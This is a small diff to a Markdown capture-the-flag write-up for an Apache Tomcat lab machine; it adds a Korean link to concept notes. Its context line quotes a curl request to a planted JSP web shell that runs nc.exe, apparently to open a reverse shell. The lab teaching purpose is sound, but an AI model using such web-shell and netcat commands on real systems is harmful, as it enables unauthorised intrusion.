@@ -72,3 +72,5 @@ curl 'http://10.10.10.95:8080/backup/cmd.jsp?cmd=c%3A%5Cwindows%5Ctemp%5Cnc.exe%
 - `c:\users\administrator\desktop\flags\2 for the price of 1.txt`
 <img width="1104" height="245" alt="image" src="https://github.com/user-attachments/assets/d09ea54c-75fd-4ea4-a02e-f3eeea6da22c" />
 
+---
+> 개념 참고 : [Apache / Apache Tomcat](https://github.com/jdh5772/Practice_Cyber_Security/blob/main/Concepts/Web.md#apache--apache-tomcat)
